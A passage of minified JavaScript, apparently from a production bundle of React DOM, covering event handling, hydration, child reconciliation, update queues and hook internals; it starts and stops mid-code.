e;if((v||m)&&(m=g.window===g?g:(m=g.ownerDocument)?m.defaultView||m.parentWindow:window,v?(k=t.relatedTarget||t.toElement,v=u,k=k?Cn(k):null,k!==null&&(E=zn(k),k!==E||k.tag!==5&&k.tag!==6)&&(k=null)):(v=null,k=u),v!==k)){if(w=vi,y="onMouseLeave",d="onMouseEnter",p="mouse",(e==="pointerout"||e==="pointerover")&&(w=ki,y="onPointerLeave",d="onPointerEnter",p="pointer"),E=v==null?m:Gn(v),h=k==null?m:Gn(k),m=new w(y,p+"leave",v,t,g),m.target=E,m.relatedTarget=h,y=null,Cn(g)===u&&(w=new w(d,p+"enter",k,t,g),w.target=h,w.relatedTarget=E,y=w),E=y,v&&k)n:{for(w=v,d=k,p=0,h=w;h;h=Fn(h))p++;for(h=0,y=d;y;y=Fn(y))h++;for(;0<p-h;)w=Fn(w),p--;for(;0<h-p;)d=Fn(d),h--;for(;p--;){if(w===d||d!==null&&w===d.alternate)break n;w=Fn(w),d=Fn(d)}w=null}else w=null;v!==null&&Ni(f,m,v,w,!1),k!==null&&E!==null&&Ni(f,E,k,w,!0)}}e:{if(m=u?Gn(u):window,v=m.nodeName&&m.nodeName.toLowerCase(),v==="select"||v==="input"&&m.type==="file")var S=Ed;else if(xi(m))if(yc)S=Pd;else{S=_d;var C=Td}else(v=m.nodeName)&&v.toLowerCase()==="input"&&(m.type==="checkbox"||m.type==="radio")&&(S=Cd);if(S&&(S=S(e,u))){vc(f,S,t,g);break e}C&&C(e,m,u),e==="focusout"&&(C=m._wrapperState)&&C.controlled&&m.type==="number"&&fa(m,"number",m.value)}switch(C=u?Gn(u):window,e){case"focusin":(xi(C)||C.contentEditable==="true")&&(Wn=C,_a=u,jt=null);break;case"focusout":jt=_a=Wn=null;break;case"mousedown":Ca=!0;break;case"contextmenu":case"mouseup":case"dragend":Ca=!1,Ci(f,t,g);break;case"selectionchange":if(Od)break;case"keydown":case"keyup":Ci(f,t,g)}var P;if(bl)e:{switch(e){case"compositionstart":var L="onCompositionStart";break e;case"compositionend":L="onCompositionEnd";break e;case"compositionupdate":L="onCompositionUpdate";break e}L=void 0}else Vn?mc(e,t)&&(L="onCompositionEnd"):e==="keydown"&&t.keyCode===229&&(L="onCompositionStart");L&&(fc&&t.locale!=="ko"&&(Vn||L!=="onCompositionStart"?L==="onCompositionEnd"&&Vn&&(P=hc()):(sn=g,yl="value"in sn?sn.value:sn.textContent,Vn=!0)),C=Ks(u,L),0<C.length&&(L=new yi(L,e,null,t,g),f.push({event:L,listeners:C}),P?L.data=P:(P=gc(t),P!==null&&(L.data=P)))),(P=kd?wd(e,t):bd(e,t))&&(u=Ks(u,"onBeforeInput"),0<u.length&&(g=new yi("onBeforeInput","beforeinput",null,t,g),f.push({event:g,listeners:u}),g.data=P))}Pc(f,n)})}function Yt(e,n,t){return{instance:e,listener:n,currentTarget:t}}function Ks(e,n){for(var t=n+"Capture",s=[];e!==null;){var r=e,a=r.stateNode;r.tag===5&&a!==null&&(r=a,a=Ut(e,t),a!=null&&s.unshift(Yt(e,a,r)),a=Ut(e,n),a!=null&&s.push(Yt(e,a,r))),e=e.return}return s}function Fn(e){if(e===null)return null;do e=e.return;while(e&&e.tag!==5);return e||null}function Ni(e,n,t,s,r){for(var a=n._reactName,l=[];t!==null&&t!==s;){var i=t,o=i.alternate,u=i.stateNode;if(o!==null&&o===s)break;i.tag===5&&u!==null&&(i=u,r?(o=Ut(t,a),o!=null&&l.unshift(Yt(t,o,i))):r||(o=Ut(t,a),o!=null&&l.push(Yt(t,o,i)))),t=t.return}l.length!==0&&e.push({event:n,listeners:l})}var Md=/\r\n?/g,Id=/\u0000|\uFFFD/g;function Oi(e){return(typeof e=="string"?e:""+e).replace(Md,`
`).replace(Id,"")}function Ss(e,n,t){if(n=Oi(n),Oi(e)!==n&&t)throw Error(b(425))}function qs(){}var Pa=null,La=null;function Na(e,n){return e==="textarea"||e==="noscript"||typeof n.children=="string"||typeof n.children=="number"||typeof n.dangerouslySetInnerHTML=="object"&&n.dangerouslySetInnerHTML!==null&&n.dangerouslySetInnerHTML.__html!=null}var Oa=typeof setTimeout=="function"?setTimeout:void 0,Dd=typeof clearTimeout=="function"?clearTimeout:void 0,Ri=typeof Promise=="function"?Promise:void 0,zd=typeof queueMicrotask=="function"?queueMicrotask:typeof Ri<"u"?function(e){return Ri.resolve(null).then(e).catch(Bd)}:Oa;function Bd(e){setTimeout(function(){throw e})}function qr(e,n){var t=n,s=0;do{var r=t.nextSibling;if(e.removeChild(t),r&&r.nodeType===8)if(t=r.data,t==="/$"){if(s===0){e.removeChild(r),Wt(n);return}s--}else t!=="$"&&t!=="$?"&&t!=="$!"||s++;t=r}while(t);Wt(n)}function un(e){for(;e!=null;e=e.nextSibling){var n=e.nodeType;if(n===1||n===3)break;if(n===8){if(n=e.data,n==="$"||n==="$!"||n==="$?")break;if(n==="/$")return null}}return e}function Ai(e){e=e.previousSibling;for(var n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="$"||t==="$!"||t==="$?"){if(n===0)return e;n--}else t==="/$"&&n++}e=e.previousSibling}return null}var ft=Math.random().toString(36).slice(2),ze="__reactFiber$"+ft,Kt="__reactProps$"+ft,Ye="__reactContainer$"+ft,Ra="__reactEvents$"+ft,Fd="__reactListeners$"+ft,Ud="__reactHandles$"+ft;function Cn(e){var n=e[ze];if(n)return n;for(var t=e.parentNode;t;){if(n=t[Ye]||t[ze]){if(t=n.alternate,n.child!==null||t!==null&&t.child!==null)for(e=Ai(e);e!==null;){if(t=e[ze])return t;e=Ai(e)}return n}e=t,t=e.parentNode}return null}function is(e){return e=e[ze]||e[Ye],!e||e.tag!==5&&e.tag!==6&&e.tag!==13&&e.tag!==3?null:e}function Gn(e){if(e.tag===5||e.tag===6)return e.stateNode;throw Error(b(33))}function yr(e){return e[Kt]||null}var Aa=[],Qn=-1;function kn(e){return{current:e}}function z(e){0>Qn||(e.current=Aa[Qn],Aa[Qn]=null,Qn--)}function I(e,n){Qn++,Aa[Qn]=e.current,e.current=n}var vn={},le=kn(vn),he=kn(!1),Rn=vn;function lt(e,n){var t=e.type.contextTypes;if(!t)return vn;var s=e.stateNode;if(s&&s.__reactInternalMemoizedUnmaskedChildContext===n)return s.__reactInternalMemoizedMaskedChildContext;var r={},a;for(a in t)r[a]=n[a];return s&&(e=e.stateNode,e.__reactInternalMemoizedUnmaskedChildContext=n,e.__reactInternalMemoizedMaskedChildContext=r),r}function fe(e){return e=e.childContextTypes,e!=null}function Zs(){z(he),z(le)}function ji(e,n,t){if(le.current!==vn)throw Error(b(168));I(le,n),I(he,t)}function Nc(e,n,t){var s=e.stateNode;if(n=n.childContextTypes,typeof s.getChildContext!="function")return t;s=s.getChildContext();for(var r in s)if(!(r in n))throw Error(b(108,Tp(e)||"Unknown",r));return H({},t,s)}function Xs(e){return e=(e=e.stateNode)&&e.__reactInternalMemoizedMergedChildContext||vn,Rn=le.current,I(le,e),I(he,he.current),!0}function Mi(e,n,t){var s=e.stateNode;if(!s)throw Error(b(169));t?(e=Nc(e,n,Rn),s.__reactInternalMemoizedMergedChildContext=e,z(he),z(le),I(le,e)):z(he),I(he,t)}var Ve=null,kr=!1,Zr=!1;function Oc(e){Ve===null?Ve=[e]:Ve.push(e)}function Hd(e){kr=!0,Oc(e)}function wn(){if(!Zr&&Ve!==null){Zr=!0;var e=0,n=M;try{var t=Ve;for(M=1;e<t.length;e++){var s=t[e];do s=s(!0);while(s!==null)}Ve=null,kr=!1}catch(r){throw Ve!==null&&(Ve=Ve.slice(e+1)),tc(fl,wn),r}finally{M=n,Zr=!1}}return null}var Yn=[],Kn=0,Js=null,er=0,xe=[],Se=0,An=null,We=1,$e="";function En(e,n){Yn[Kn++]=er,Yn[Kn++]=Js,Js=e,er=n}function Rc(e,n,t){xe[Se++]=We,xe[Se++]=$e,xe[Se++]=An,An=e;var s=We;e=$e;var r=32-Ae(s)-1;s&=~(1<<r),t+=1;var a=32-Ae(n)+r;if(30<a){var l=r-r%5;a=(s&(1<<l)-1).toString(32),s>>=l,r-=l,We=1<<32-Ae(n)+r|t<<r|s,$e=a+e}else We=1<<a|t<<r|s,$e=e}function Sl(e){e.return!==null&&(En(e,1),Rc(e,1,0))}function El(e){for(;e===Js;)Js=Yn[--Kn],Yn[Kn]=null,er=Yn[--Kn],Yn[Kn]=null;for(;e===An;)An=xe[--Se],xe[Se]=null,$e=xe[--Se],xe[Se]=null,We=xe[--Se],xe[Se]=null}var ye=null,ve=null,B=!1,Re=null;function Ac(e,n){var t=Ee(5,null,null,0);t.elementType="DELETED",t.stateNode=n,t.return=e,n=e.deletions,n===null?(e.deletions=[t],e.flags|=16):n.push(t)}function Ii(e,n){switch(e.tag){case 5:var t=e.type;return n=n.nodeType!==1||t.toLowerCase()!==n.nodeName.toLowerCase()?null:n,n!==null?(e.stateNode=n,ye=e,ve=un(n.firstChild),!0):!1;case 6:return n=e.pendingProps===""||n.nodeType!==3?null:n,n!==null?(e.stateNode=n,ye=e,ve=null,!0):!1;case 13:return n=n.nodeType!==8?null:n,n!==null?(t=An!==null?{id:We,overflow:$e}:null,e.memoizedState={dehydrated:n,treeContext:t,retryLane:1073741824},t=Ee(18,null,null,0),t.stateNode=n,t.return=e,e.child=t,ye=e,ve=null,!0):!1;default:return!1}}function ja(e){return(e.mode&1)!==0&&(e.flags&128)===0}function Ma(e){if(B){var n=ve;if(n){var t=n;if(!Ii(e,n)){if(ja(e))throw Error(b(418));n=un(t.nextSibling);var s=ye;n&&Ii(e,n)?Ac(s,t):(e.flags=e.flags&-4097|2,B=!1,ye=e)}}else{if(ja(e))throw Error(b(418));e.flags=e.flags&-4097|2,B=!1,ye=e}}}function Di(e){for(e=e.return;e!==null&&e.tag!==5&&e.tag!==3&&e.tag!==13;)e=e.return;ye=e}function Es(e){if(e!==ye)return!1;if(!B)return Di(e),B=!0,!1;var n;if((n=e.tag!==3)&&!(n=e.tag!==5)&&(n=e.type,n=n!=="head"&&n!=="body"&&!Na(e.type,e.memoizedProps)),n&&(n=ve)){if(ja(e))throw jc(),Error(b(418));for(;n;)Ac(e,n),n=un(n.nextSibling)}if(Di(e),e.tag===13){if(e=e.memoizedState,e=e!==null?e.dehydrated:null,!e)throw Error(b(317));e:{for(e=e.nextSibling,n=0;e;){if(e.nodeType===8){var t=e.data;if(t==="/$"){if(n===0){ve=un(e.nextSibling);break e}n--}else t!=="$"&&t!=="$!"&&t!=="$?"||n++}e=e.nextSibling}ve=null}}else ve=ye?un(e.stateNode.nextSibling):null;return!0}function jc(){for(var e=ve;e;)e=un(e.nextSibling)}function it(){ve=ye=null,B=!1}function Tl(e){Re===null?Re=[e]:Re.push(e)}var Vd=Ze.ReactCurrentBatchConfig;function St(e,n,t){if(e=t.ref,e!==null&&typeof e!="function"&&typeof e!="object"){if(t._owner){if(t=t._owner,t){if(t.tag!==1)throw Error(b(309));var s=t.stateNode}if(!s)throw Error(b(147,e));var r=s,a=""+e;return n!==null&&n.ref!==null&&typeof n.ref=="function"&&n.ref._stringRef===a?n.ref:(n=function(l){var i=r.refs;l===null?delete i[a]:i[a]=l},n._stringRef=a,n)}if(typeof e!="string")throw Error(b(284));if(!t._owner)throw Error(b(290,e))}return e}function Ts(e,n){throw e=Object.prototype.toString.call(n),Error(b(31,e==="[object Object]"?"object with keys {"+Object.keys(n).join(", ")+"}":e))}function zi(e){var n=e._init;return n(e._payload)}function Mc(e){function n(d,p){if(e){var h=d.deletions;h===null?(d.deletions=[p],d.flags|=16):h.push(p)}}function t(d,p){if(!e)return null;for(;p!==null;)n(d,p),p=p.sibling;return null}function s(d,p){for(d=new Map;p!==null;)p.key!==null?d.set(p.key,p):d.set(p.index,p),p=p.sibling;return d}function r(d,p){return d=fn(d,p),d.index=0,d.sibling=null,d}function a(d,p,h){return d.index=h,e?(h=d.alternate,h!==null?(h=h.index,h<p?(d.flags|=2,p):h):(d.flags|=2,p)):(d.flags|=1048576,p)}function l(d){return e&&d.alternate===null&&(d.flags|=2),d}function i(d,p,h,y){return p===null||p.tag!==6?(p=ra(h,d.mode,y),p.return=d,p):(p=r(p,h),p.return=d,p)}function o(d,p,h,y){var S=h.type;return S===Hn?g(d,p,h.props.children,y,h.key):p!==null&&(p.elementType===S||typeof S=="object"&&S!==null&&S.$$typeof===Je&&zi(S)===p.type)?(y=r(p,h.props),y.ref=St(d,p,h),y.return=d,y):(y=Us(h.type,h.key,h.props,null,d.mode,y),y.ref=St(d,p,h),y.return=d,y)}function u(d,p,h,y){return p===null||p.tag!==4||p.stateNode.containerInfo!==h.containerInfo||p.stateNode.implementation!==h.implementation?(p=aa(h,d.mode,y),p.return=d,p):(p=r(p,h.children||[]),p.return=d,p)}function g(d,p,h,y,S){return p===null||p.tag!==7?(p=On(h,d.mode,y,S),p.return=d,p):(p=r(p,h),p.return=d,p)}function f(d,p,h){if(typeof p=="string"&&p!==""||typeof p=="number")return p=ra(""+p,d.mode,h),p.return=d,p;if(typeof p=="object"&&p!==null){switch(p.$$typeof){case fs:return h=Us(p.type,p.key,p.props,null,d.mode,h),h.ref=St(d,null,p),h.return=d,h;case Un:return p=aa(p,d.mode,h),p.return=d,p;case Je:var y=p._init;return f(d,y(p._payload),h)}if(Ct(p)||yt(p))return p=On(p,d.mode,h,null),p.return=d,p;Ts(d,p)}return null}function m(d,p,h,y){var S=p!==null?p.key:null;if(typeof h=="string"&&h!==""||typeof h=="number")return S!==null?null:i(d,p,""+h,y);if(typeof h=="object"&&h!==null){switch(h.$$typeof){case fs:return h.key===S?o(d,p,h,y):null;case Un:return h.key===S?u(d,p,h,y):null;case Je:return S=h._init,m(d,p,S(h._payload),y)}if(Ct(h)||yt(h))return S!==null?null:g(d,p,h,y,null);Ts(d,h)}return null}function v(d,p,h,y,S){if(typeof y=="string"&&y!==""||typeof y=="number")return d=d.get(h)||null,i(p,d,""+y,S);if(typeof y=="object"&&y!==null){switch(y.$$typeof){case fs:return d=d.get(y.key===null?h:y.key)||null,o(p,d,y,S);case Un:return d=d.get(y.key===null?h:y.key)||null,u(p,d,y,S);case Je:var C=y._init;return v(d,p,h,C(y._payload),S)}if(Ct(y)||yt(y))return d=d.get(h)||null,g(p,d,y,S,null);Ts(p,y)}return null}function k(d,p,h,y){for(var S=null,C=null,P=p,L=p=0,W=null;P!==null&&L<h.length;L++){P.index>L?(W=P,P=null):W=P.sibling;var A=m(d,P,h[L],y);if(A===null){P===null&&(P=W);break}e&&P&&A.alternate===null&&n(d,P),p=a(A,p,L),C===null?S=A:C.sibling=A,C=A,P=W}if(L===h.length)return t(d,P),B&&En(d,L),S;if(P===null){for(;L<h.length;L++)P=f(d,h[L],y),P!==null&&(p=a(P,p,L),C===null?S=P:C.sibling=P,C=P);return B&&En(d,L),S}for(P=s(d,P);L<h.length;L++)W=v(P,d,L,h[L],y),W!==null&&(e&&W.alternate!==null&&P.delete(W.key===null?L:W.key),p=a(W,p,L),C===null?S=W:C.sibling=W,C=W);return e&&P.forEach(function(Pe){return n(d,Pe)}),B&&En(d,L),S}function w(d,p,h,y){var S=yt(h);if(typeof S!="function")throw Error(b(150));if(h=S.call(h),h==null)throw Error(b(151));for(var C=S=null,P=p,L=p=0,W=null,A=h.next();P!==null&&!A.done;L++,A=h.next()){P.index>L?(W=P,P=null):W=P.sibling;var Pe=m(d,P,A.value,y);if(Pe===null){P===null&&(P=W);break}e&&P&&Pe.alternate===null&&n(d,P),p=a(Pe,p,L),C===null?S=Pe:C.sibling=Pe,C=Pe,P=W}if(A.done)return t(d,P),B&&En(d,L),S;if(P===null){for(;!A.done;L++,A=h.next())A=f(d,A.value,y),A!==null&&(p=a(A,p,L),C===null?S=A:C.sibling=A,C=A);return B&&En(d,L),S}for(P=s(d,P);!A.done;L++,A=h.next())A=v(P,d,L,A.value,y),A!==null&&(e&&A.alternate!==null&&P.delete(A.key===null?L:A.key),p=a(A,p,L),C===null?S=A:C.sibling=A,C=A);return e&&P.forEach(function(gt){return n(d,gt)}),B&&En(d,L),S}function E(d,p,h,y){if(typeof h=="object"&&h!==null&&h.type===Hn&&h.key===null&&(h=h.props.children),typeof h=="object"&&h!==null){switch(h.$$typeof){case fs:e:{for(var S=h.key,C=p;C!==null;){if(C.key===S){if(S=h.type,S===Hn){if(C.tag===7){t(d,C.sibling),p=r(C,h.props.children),p.return=d,d=p;break e}}else if(C.elementType===S||typeof S=="object"&&S!==null&&S.$$typeof===Je&&zi(S)===C.type){t(d,C.sibling),p=r(C,h.props),p.ref=St(d,C,h),p.return=d,d=p;break e}t(d,C);break}else n(d,C);C=C.sibling}h.type===Hn?(p=On(h.props.children,d.mode,y,h.key),p.return=d,d=p):(y=Us(h.type,h.key,h.props,null,d.mode,y),y.ref=St(d,p,h),y.return=d,d=y)}return l(d);case Un:e:{for(C=h.key;p!==null;){if(p.key===C)if(p.tag===4&&p.stateNode.containerInfo===h.containerInfo&&p.stateNode.implementation===h.implementation){t(d,p.sibling),p=r(p,h.children||[]),p.return=d,d=p;break e}else{t(d,p);break}else n(d,p);p=p.sibling}p=aa(h,d.mode,y),p.return=d,d=p}return l(d);case Je:return C=h._init,E(d,p,C(h._payload),y)}if(Ct(h))return k(d,p,h,y);if(yt(h))return w(d,p,h,y);Ts(d,h)}return typeof h=="string"&&h!==""||typeof h=="number"?(h=""+h,p!==null&&p.tag===6?(t(d,p.sibling),p=r(p,h),p.return=d,d=p):(t(d,p),p=ra(h,d.mode,y),p.return=d,d=p),l(d)):t(d,p)}return E}var ot=Mc(!0),Ic=Mc(!1),nr=kn(null),tr=null,qn=null,_l=null;function Cl(){_l=qn=tr=null}function Pl(e){var n=nr.current;z(nr),e._currentValue=n}function Ia(e,n,t){for(;e!==null;){var s=e.alternate;if((e.childLanes&n)!==n?(e.childLanes|=n,s!==null&&(s.childLanes|=n)):s!==null&&(s.childLanes&n)!==n&&(s.childLanes|=n),e===t)break;e=e.return}}function st(e,n){tr=e,_l=qn=null,e=e.dependencies,e!==null&&e.firstContext!==null&&(e.lanes&n&&(de=!0),e.firstContext=null)}function _e(e){var n=e._currentValue;if(_l!==e)if(e={context:e,memoizedValue:n,next:null},qn===null){if(tr===null)throw Error(b(308));qn=e,tr.dependencies={lanes:0,firstContext:e}}else qn=qn.next=e;return n}var Pn=null;function Ll(e){Pn===null?Pn=[e]:Pn.push(e)}function Dc(e,n,t,s){var r=n.interleaved;return r===null?(t.next=t,Ll(n)):(t.next=r.next,r.next=t),n.interleaved=t,Ke(e,s)}function Ke(e,n){e.lanes|=n;var t=e.alternate;for(t!==null&&(t.lanes|=n),t=e,e=e.return;e!==null;)e.childLanes|=n,t=e.alternate,t!==null&&(t.childLanes|=n),t=e,e=e.return;return t.tag===3?t.stateNode:null}var en=!1;function Nl(e){e.updateQueue={baseState:e.memoizedState,firstBaseUpdate:null,lastBaseUpdate:null,shared:{pending:null,interleaved:null,lanes:0},effects:null}}function zc(e,n){e=e.updateQueue,n.updateQueue===e&&(n.updateQueue={baseState:e.baseState,firstBaseUpdate:e.firstBaseUpdate,lastBaseUpdate:e.lastBaseUpdate,shared:e.shared,effects:e.effects})}function Ge(e,n){return{eventTime:e,lane:n,tag:0,payload:null,callback:null,next:null}}function pn(e,n,t){var s=e.updateQueue;if(s===null)return null;if(s=s.shared,j&2){var r=s.pending;return r===null?n.next=n:(n.next=r.next,r.next=n),s.pending=n,Ke(e,t)}return r=s.interleaved,r===null?(n.next=n,Ll(s)):(n.next=r.next,r.next=n),s.interleaved=n,Ke(e,t)}function Ms(e,n,t){if(n=n.updateQueue,n!==null&&(n=n.shared,(t&4194240)!==0)){var s=n.lanes;s&=e.pendingLanes,t|=s,n.lanes=t,ml(e,t)}}function Bi(e,n){var t=e.updateQueue,s=e.alternate;if(s!==null&&(s=s.updateQueue,t===s)){var r=null,a=null;if(t=t.firstBaseUpdate,t!==null){do{var l={eventTime:t.eventTime,lane:t.lane,tag:t.tag,payload:t.payload,callback:t.callback,next:null};a===null?r=a=l:a=a.next=l,t=t.next}while(t!==null);a===null?r=a=n:a=a.next=n}else r=a=n;t={baseState:s.baseState,firstBaseUpdate:r,lastBaseUpdate:a,shared:s.shared,effects:s.effects},e.updateQueue=t;return}e=t.lastBaseUpdate,e===null?t.firstBaseUpdate=n:e.next=n,t.lastBaseUpdate=n}function sr(e,n,t,s){var r=e.updateQueue;en=!1;var a=r.firstBaseUpdate,l=r.lastBaseUpdate,i=r.shared.pending;if(i!==null){r.shared.pending=null;var o=i,u=o.next;o.next=null,l===null?a=u:l.next=u,l=o;var g=e.alternate;g!==null&&(g=g.updateQueue,i=g.lastBaseUpdate,i!==l&&(i===null?g.firstBaseUpdate=u:i.next=u,g.lastBaseUpdate=o))}if(a!==null){var f=r.baseState;l=0,g=u=o=null,i=a;do{var m=i.lane,v=i.eventTime;if((s&m)===m){g!==null&&(g=g.next={eventTime:v,lane:0,tag:i.tag,payload:i.payload,callback:i.callback,next:null});e:{var k=e,w=i;switch(m=n,v=t,w.tag){case 1:if(k=w.payload,typeof k=="function"){f=k.call(v,f,m);break e}f=k;break e;case 3:k.flags=k.flags&-65537|128;case 0:if(k=w.payload,m=typeof k=="function"?k.call(v,f,m):k,m==null)break e;f=H({},f,m);break e;case 2:en=!0}}i.callback!==null&&i.lane!==0&&(e.flags|=64,m=r.effects,m===null?r.effects=[i]:m.push(i))}else v={eventTime:v,lane:m,tag:i.tag,payload:i.payload,callback:i.callback,next:null},g===null?(u=g=v,o=f):g=g.next=v,l|=m;if(i=i.next,i===null){if(i=r.shared.pending,i===null)break;m=i,i=m.next,m.next=null,r.lastBaseUpdate=m,r.shared.pending=null}}while(!0);if(g===null&&(o=f),r.baseState=o,r.firstBaseUpdate=u,r.lastBaseUpdate=g,n=r.shared.interleaved,n!==null){r=n;do l|=r.lane,r=r.next;while(r!==n)}else a===null&&(r.shared.lanes=0);Mn|=l,e.lanes=l,e.memoizedState=f}}function Fi(e,n,t){if(e=n.effects,n.effects=null,e!==null)for(n=0;n<e.length;n++){var s=e[n],r=s.callback;if(r!==null){if(s.callback=null,s=t,typeof r!="function")throw Error(b(191,r));r.call(s)}}}var os={},Fe=kn(os),qt=kn(os),Zt=kn(os);function Ln(e){if(e===os)throw Error(b(174));return e}function Ol(e,n){switch(I(Zt,n),I(qt,e),I(Fe,os),e=n.nodeType,e){case 9:case 11:n=(n=n.documentElement)?n.namespaceURI:ga(null,"");break;default:e=e===8?n.parentNode:n,n=e.namespaceURI||null,e=e.tagName,n=ga(n,e)}z(Fe),I(Fe,n)}function ct(){z(Fe),z(qt),z(Zt)}function Bc(e){Ln(Zt.current);var n=Ln(Fe.current),t=ga(n,e.type);n!==t&&(I(qt,e),I(Fe,t))}function Rl(e){qt.current===e&&(z(Fe),z(qt))}var F=kn(0);function rr(e){for(var n=e;n!==null;){if(n.tag===13){var t=n.memoizedState;if(t!==null&&(t=t.dehydrated,t===null||t.data==="$?"||t.data==="$!"))return n}else if(n.tag===19&&n.memoizedProps.revealOrder!==void 0){if(n.flags&128)return n}else if(n.child!==null){n.child.return=n,n=n.child;continue}if(n===e)break;for(;n.sibling===null;){if(n.return===null||n.return===e)return null;n=n.return}n.sibling.return=n.return,n=n.sibling}return null}var Xr=[];function Al(){for(var e=0;e<Xr.length;e++)Xr[e]._workInProgressVersionPrimary=null;Xr.length=0}var Is=Ze.ReactCurrentDispatcher,Jr=Ze.ReactCurrentBatchConfig,jn=0,U=null,K=null,X=null,ar=!1,Mt=!1,Xt=0,Wd=0;function se(){throw Error(b(321))}function jl(e,n){if(n===null)return!1;for(var t=0;t<n.length&&t<e.length;t++)if(!Me(e[t],n[t]))return!1;return!0}function Ml(e,n,t,s,r,a){if(jn=a,U=n,n.memoizedState=null,n.updateQueue=null,n.lanes=0,Is.current=e===null||e.memoizedState===null?Yd:Kd,e=t(s,r),Mt){a=0;do{if(Mt=!1,Xt=0,25<=a)throw Error(b(301));a+=1,X=K=null,n.updateQueue=null,Is.current=qd,e=t(s,r)}while(Mt)}if(Is.current=lr,n=K!==null&&K.next!==null,jn=0,X=K=U=null,ar=!1,n)throw Error(b(300));return e}function Il(){var e=Xt!==0;return Xt=0,e}function De(){var e={memoizedState:null,baseState:null,baseQueue:null,queue:null,next:null};return X===null?U.memoizedState=X=e:X=X.next=e,X}function Ce(){if(K===null){var e=U.alternate;e=e!==null?e.memoizedState:null}else e=K.next;var n=X===null?U.memoizedState:X.next;if(n!==null)X=n,K=e;else{if(e===null)throw Error(b(310));K=e,e={memoizedState:K.memoizedState,baseState:K.baseState,baseQueue:K.baseQueue,queue:K.queue,next:null},X===null?U.memoizedState=X=e:X=X.next=e}return X}function Jt(e,n){return typeof n=="function"?n(e):n}function ea(e){var n=Ce(),t=n.queue;if(t===null)throw Error(b(311));t.lastRenderedReducer=e;var s=K,r=s.baseQueue,a=t.pending;if(a!==null){if(r!==null){var l=r.next;r.next=a.next,a.next=l}s.baseQueue=r=a,t.pending=null}if(r!==null){a=r.next,s=s.baseState;var i=l=null,o=null,u=a;do{var g=u.lane;if((jn&g)===g)o!==null&&(o=o.next={lane:0,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null}),s=u.hasEagerState?u.eagerState:e(s,u.action);else{var f={lane:g,action:u.action,hasEagerState:u.hasEagerState,eagerState:u.eagerState,next:null};o===null?(i=o=f,l=s):o=o.next=f,U.lanes|=g,Mn|=g}u=u.next}while(u!==null&&u!==a);o===null?l=s:o.next=i,Me(s,n.memoizedState)||(de=!0),n.memoizedState=s,n.baseState=l,n.baseQueue=o,t.lastRenderedState=s}if(e=t.interleaved,e!==null){r=e;do a=r.lane,U.lanes|=a,Mn|=a,r=r.next;while(r!==e)}else r===null&&(t.lanes=0);return[n.memoizedState,t.dispatch]}function na(e){var n=Ce(),t=n.queue;if(t===null)throw Error(b(311));t.lastRenderedReducer=e;var s=t.dispatch,r=t.pending,a=n.memoizedState;if(r!==null){t.pending=null;var l=r=r.next;do a=e(a,l.action),l=l.next;while(l!==r);Me(a,n.memoizedState)||(de=!0),n.memoizedState=a,n.baseQueue===null&&(n.baseState=a),t.lastRenderedState=a}return[a,s]}function Fc(){}function Uc(e,n){var t=U,s=Ce(),r=n(),a=!Me(s.memoizedState,r);if(a&&(s.memoizedState=r,de=!0),s=s.queue,Dl(Wc.bind(null,t,s,e),[e]),s.getSnapshot!==n||a||X!==null&&X.memoizedState.tag&1){if(t.flags|=2048,es(9,Vc.bind(null,t,s,r,n),void 0,null),J===null)throw Error(b(349));jn&30||Hc(t,n,r)}return r}function Hc(e,n,t){e.flags|=16384,e={getSnapshot:n,value:t},n=U.updateQueue,n===null?(n={lastEffect:null,stores:null},U.updateQueue=n,n.stores=[e]):(t=n.stores,t===null?n.stores=[e]:t.push(e))}function Vc(e,n,t,s){n.value=t,n.getSnapshot=s,$c(n)&&Gc(e)}function Wc(e,n,t){return t(function(){$c(n)&&Gc(e)})}function $c(e){var n=e.getSnapshot;e=e.value;try{var t=n();return!Me(e,t)}catch{return!0}}function Gc(e){var n=Ke(e,1);n!==null&&je(n,e,1,-1)}function Ui(e){var n=De();return typeof e=="function"&&(e=e()),n.memoizedState=n.baseState=e,e={pending:null,interleaved:null,lanes:0,dispatch:null,lastRenderedReducer:Jt,lastRenderedState:e},n.queue=e,e=e.dispatch=Qd.bind(null,U,e),[n.memoizedState,e]}function es(e,n,t,s){return e={tag:e,create:n,destroy:t,deps:s,next:null},n=U.updateQueue,n===null?(n={lastEffect:null,stores:null},U.updateQueue=n,n.lastEffect=e.next=e):(t=n.lastEffect,t===null?n.lastEffect=e.next=e:(s=t.next,t.next=e,e.next=s,n.lastEffect=e)),e}function Qc(){return Ce().memoizedState}function Ds(e,n,t,s){var r=De();U.flags|=e,r.memoizedState=es(1|n,t,void 0,s===void 0?null:s)}function wr(e,n,t,s){var r=Ce();s=s===void 0?null:s;var a=void 0;if(K!==null){var l=K.memoizedState;if(a=l.destroy,s!==null&&jl(s,l.deps)){r.memoizedState=es(n,t,a,s);return}}U.flags|=e,r.memoizedState=es(1|n,t,a,s)}function Hi(e,n){return Ds(8390656,8,e,n)}function Dl(e,n){return wr(2048,8,e,n)}function Yc(e,n){return wr(4,2,e,n)}function Kc(e,n){return wr(4,4,e,n)}function qc(e,n){if(typeof n=="function")return e=e(),n(e),function(){n(null)};if(n!=null)return e=e(),n.current=e,function(){n.current=null}}function Zc(e,n,t){return t=t!=null?t.concat([e]):null,wr(4,4,qc.bind(null,n,e),t)}function zl(){}function Xc(e,n){var t=Ce();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&jl(n,s[1])?s[0]:(t.memoizedState=[e,n],e)}function Jc(e,n){var t=Ce();n=n===void 0?null:n;var s=t.memoizedState;return s!==null&&n!==null&&jl(n,s[1])?s[0]:(e=e(),t.memoizedState=[e,n],e)}function eu(e,n,t){return jn&21?(Me(t,n)||(t=ac(),U.lanes|=t,Mn|=t,e.baseState=!0),n):(e.baseState&&(e.baseState=!1,de=!0),e.memoizedState=t)}function $d(e,n){var t=M;M=t!==0&&4>t?t:4,e(!0);var s=Jr.transition;Jr.transition={};try{e(!1),n()}finally{M=t,Jr.transition=s}}function nu(){return Ce().memoizedState}function Gd(e,n,t){var s=hn(e);if(t={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null},tu(e))su(n,t);else if(t=Dc(e,n,t,s),t!==null){var r=oe();je(t,e,s,r),ru(t,n,s)}}function Qd(e,n,t){var s=hn(e),r={lane:s,action:t,hasEagerState:!1,eagerState:null,next:null};if(tu(e))su(n,r);else{var a=e.alternate;if(e.lanes===0&&(a===null||a.lanes===0)&&(a=n.lastRenderedReducer,a!==null))try{var 